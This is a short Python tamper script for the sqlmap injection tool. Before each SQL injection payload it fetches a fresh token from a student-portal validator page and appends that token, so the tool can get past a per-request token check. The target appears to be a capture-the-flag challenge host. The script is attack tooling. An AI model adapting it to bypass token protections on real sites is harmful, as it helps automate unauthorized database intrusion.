#!/usr/bin/env python

from lib.core.data import kb
from lib.core.enums import PRIORITY
import requests

__priority__ = PRIORITY.HIGHEST

def get_token():
    # Creating a session to handle cookies
    token = ''
    s = requests.Session()
    url = "https://studentportal.elfu.org/"
    response = s.get("{}/validator.php".format(url))
    if response.status_code == 200:
        token = response.content
    return token.decode('utf-8')

def dependencies():
    pass

def tamper(payload, **kwargs):
    token = get_token()
    retVal = payload + '#'
    print("-------->"+payload)
    retVal += '&token=' + token
    return retVal

